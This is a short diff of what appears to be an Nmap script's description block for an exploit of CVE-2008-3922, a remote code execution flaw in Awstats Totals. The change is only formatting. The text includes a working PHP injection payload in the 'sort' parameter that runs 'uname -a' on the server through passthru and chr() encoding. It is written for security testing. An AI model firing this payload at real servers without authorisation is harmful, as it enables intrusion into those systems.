@@ -7,9 +7,13 @@ local string = require "string"
 local table = require "table"
 
 description = [[
-Exploits a remote code execution vulnerability in Awstats Totals 1.0 up to 1.14 and possibly other products based on it (CVE: 2008-3922).
+Exploits a remote code execution vulnerability in Awstats Totals 1.0 up to 1.14
+and possibly other products based on it (CVE: 2008-3922).
 
-This vulnerability can be exploited through the GET variable sort. The script queries the web server with the command payload encoded using PHP's chr() function:
+This vulnerability can be exploited through the GET variable <code>sort</code>.
+The script queries the web server with the command payload encoded using PHP's
+chr() function:
+
 <code>?sort={%24{passthru%28chr(117).chr(110).chr(97).chr(109).chr(101).chr(32).chr(45).chr(97)%29}}{%24{exit%28%29}}</code>
 
 Common paths for Awstats Total:
